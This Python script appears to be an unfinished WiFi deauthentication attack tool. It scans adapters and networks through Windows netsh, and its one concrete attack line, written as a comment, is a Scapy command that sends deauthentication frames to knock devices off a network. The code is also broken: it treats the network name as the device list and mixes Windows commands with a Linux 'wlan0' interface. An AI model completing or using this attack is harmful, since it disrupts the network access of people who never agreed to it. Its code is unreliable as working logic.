import subprocess
import time

# Function to scan for WiFi networks
def scan_networks(adapter):
    networks = subprocess.check_output(['netsh', 'wlan', 'show', 'network', 'interface=' + adapter]).decode('utf-8').split('\n')
    networks = [line.split(':')[1][1:-1] for line in networks if "SSID" in line]
    print("Available Networks:")
    for i, network in enumerate(networks):
        print(f"{i+1}. SSID: {network}")
    return networks

# Function to select a network from the scanned networks
def select_network(networks):
    while True:
        try:
            choice = int(input("Enter the number corresponding to the network you want to select: "))
            if 1 <= choice <= len(networks):
                return networks[choice - 1]
            else:
                print("Invalid choice. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a number.")

# Function to scan devices on the selected network
def scan_devices(network):
    print(f"Scanning devices on network '{network}'...")
    # Implement device scanning logic here
    # You can use ARP scanning, Nmap, or other methods to scan devices

# Function to send deauthentication frames to selected devices
def deauth_devices(devices):
    for device in devices:
        print(f"Sending deauthentication frames to {device}...")
        # Craft and send deauthentication frames using Scapy
        # Example: sendp(RadioTap() / Dot11(addr1=device, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth(reason=7), iface="wlan0", inter=0.1, verbose=False)
        time.sleep(0.1)  # Delay between sending frames

# Main function
def main():
    adapters = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode('utf-8').split('\n')
    adapters = [line.split(':')[1][1:-1] for line in adapters if "Name" in line]
    if not adapters:
        print("No WiFi adapter connected. Exiting to main menu...")
        time.sleep(1)

        return
    print("Available WiFi adapters:")
    for i, adapter in enumerate(adapters):
        print(f"{i+1}. Adapter: {adapter}")
    adapter_choice = int(input("Enter the number corresponding to the WiFi adapter you want to use: "))
    selected_adapter = adapters[adapter_choice - 1]
    networks = scan_networks(selected_adapter)
    selected_network = select_network(networks)
    scan_devices(selected_network)
    # Let's assume user selects all devices for deauthentication
    selected_devices = selected_network
    deauth_devices(selected_devices)

# Execute main function
if __name__ == "__main__":
    main()
